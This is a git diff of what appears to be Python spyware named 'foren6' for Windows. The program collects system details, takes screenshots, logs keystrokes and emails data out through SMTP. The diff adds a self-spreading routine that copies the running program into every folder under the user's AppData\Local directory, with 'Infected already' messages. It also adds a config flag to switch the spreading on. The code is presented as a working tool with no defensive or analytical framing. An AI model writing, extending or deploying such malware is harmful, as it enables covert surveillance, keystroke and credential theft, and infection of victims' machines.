@@ -14,8 +14,8 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 import glob
-from shutil import copyfile
-
+import shutil 
+import sys
 
 
 
@@ -150,19 +150,32 @@ def send_info1(time_wait, data):
 		print("email sent")
 		time.sleep(time_wait)
 
-def copy_files(time):
-	time.sleep(time)
+def copy_files():
+	print("Copying files")
 	username = psutil.users()[0][0]
-	a = glob(f"C:\\Users\\{username}\\AppData\\*\\")
+
+	fileName = sys.argv[0]
+	if fileName[-1] == "e":
+		name = "foren6.exe"
+	else:
+		name = "foren6.py"
+
+	
+	a = glob.glob(f"C:\Users\{username}\AppData\Local")
+	print(f"C:\Users\{username}\AppData\Local")
+	print(a)
 	for b in a:
-		for file in glob(f"{b}\\*"):
-			print(file)
-			if file == f"{b}foren6.exe":
-				print("Already infected")
-			else:
-				copyfile(__file__[0,-9], b)
-
-
+		print(b)
+		print("-")
+		for folder in glob.glob(f"{b}\\*\\"):
+			print(folder)
+			print("_")
+			for file in glob.glob(f"{folder}\\*"):
+				print(file)
+				try:
+					shutil.copy(sys.argv[0], folder)
+				except:
+					print("Infected already")
     	
 	
 
@@ -181,12 +194,13 @@ def system_info():
 	local_ip = "Local ip: "+socket.gethostbyname(socket.gethostname())
 	host_name = "host name: "+socket.gethostname()
 	username = psutil.users()[0][0]
-	system_info_list.append("USER |",username)
-	system_info_list.append("PROCESSOR |",processor)
-	system_info_list.append("RAM |",ram)
-	system_info_list.append("MAC ADDRESS |",mac_address)
-	system_info_list.append("LOCAL IP |",local_ip)
-	system_info_list.append("HOST NAME |",host_name)
+
+	system_info_list.append(f"USER | {username}")
+	system_info_list.append(f"PROCESSOR | {processor}")
+	system_info_list.append(f"RAM | {ram}")
+	system_info_list.append(f"MAC ADDRESS | {mac_address}")
+	system_info_list.append(f"LOCAL IP | {local_ip}")
+	system_info_list.append(f"HOST NAME | {host_name}")
 	
 	system_info_file = open("System_Info.txt", "w")
 	for info in system_info_list:
@@ -202,7 +216,9 @@ if system == "Windows":
 	get_system_info = data["get_system_info"]
 	send_info_email = data["send_info"]
 	email_send = data["email_send_time"]
+	spread_files = data["spread_files"]
 	print(screenshot)
+	
 	if screenshot:
 		screenshot_taking = threading.Thread(target=take_screenshot, args=(screenshot_time,))
 		screenshot_taking.start()
@@ -217,7 +233,13 @@ if system == "Windows":
 
 	if get_system_info:
 		sys_thread = threading.Thread(target=system_info) 
-		sys_thread.start()   
+		sys_thread.start()
+
+	if spread_files:
+		copy_files()
+
+	
+	
 	if keylog:
 		with Listener(on_press=log_keystroke) as l:
 			l.join()
